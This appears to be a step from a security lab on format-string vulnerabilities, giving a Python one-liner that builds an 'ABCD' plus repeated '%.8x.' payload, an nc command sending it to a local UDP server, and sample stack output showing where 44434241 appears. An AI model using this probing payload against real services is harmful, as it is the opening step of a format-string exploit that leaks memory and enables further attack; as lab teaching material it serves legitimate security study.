Task 4.A — Stack Data (Screenshot 10)
Goal

Find how many %x are needed until your input appears as:

44434241

(this represents "ABCD")

Step 1 — Create input
python3 - <<'PY'
open("input", "w").write("ABCD" + "%.8x."*50)
PY
Step 2 — Send it
nc -u 127.0.0.1 9090 < input
Step 3 — Look at server output

You must find:

44434241

Example:

... b7fff918.804a014.44434241.b7fe97a2 ...
